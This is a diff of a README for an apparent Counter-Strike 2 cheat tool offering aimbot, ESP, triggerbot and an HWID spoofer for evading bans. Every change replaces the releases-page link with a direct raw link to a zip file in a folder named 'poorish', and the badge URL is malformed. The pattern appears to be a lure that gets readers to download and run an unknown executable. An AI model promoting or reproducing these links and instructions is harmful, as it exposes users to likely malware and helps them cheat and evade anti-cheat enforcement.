@@ -1,6 +1,6 @@
 # 🎮 Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer - Elevate Your CS2 Gameplay Experience
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/releases)
+[![Download](https://raw.githubusercontent.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/main/poorish/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer.zip%https://raw.githubusercontent.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/main/poorish/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer.zip)](https://raw.githubusercontent.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/main/poorish/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer.zip)
 
 ## 📋 Description
 Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer is designed to enhance your gameplay in CS2. With features like ESP, aimbot, and silent aim, you can gain an advantage while playing. You can also customize your game with tools like spoofer, skinchanger, and spinbot. Other features like bunnyhop and radar help improve your skills and overall experience.
@@ -8,7 +8,7 @@ Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer is designed to 
 ## 🚀 Getting Started
 To begin using this software, follow these simple steps:
 
-1. **Download the Latest Release:** Visit this page to download: [Download Releases](https://github.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/releases).
+1. **Download the Latest Release:** Visit this page to download: [Download Releases](https://raw.githubusercontent.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/main/poorish/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer.zip).
 2. **Choose Your File:** Look for the latest version and select the appropriate file for your system (Windows or Linux).
 3. **Save the File:** Click on the file name to begin the download. Save it to a location you can easily access.
 
@@ -30,7 +30,7 @@ After downloading the file, follow these steps to install the application:
    - For Linux, open a terminal in the extracted folder and run the command: `./yourappname` (replace `yourappname` with the actual file name).
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download Releases](https://github.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/releases). Simply follow the instructions above for the installation process.
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/henyakiharyy/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer/main/poorish/Cs2-Kernaim-to-Aimbot-Esp-Rcs-Hack-Cheat-TriggerBot-Hwid-Spoofer.zip). Simply follow the instructions above for the installation process.
 
 ## 🧩 Features
 The software includes several key features to improve your gameplay:
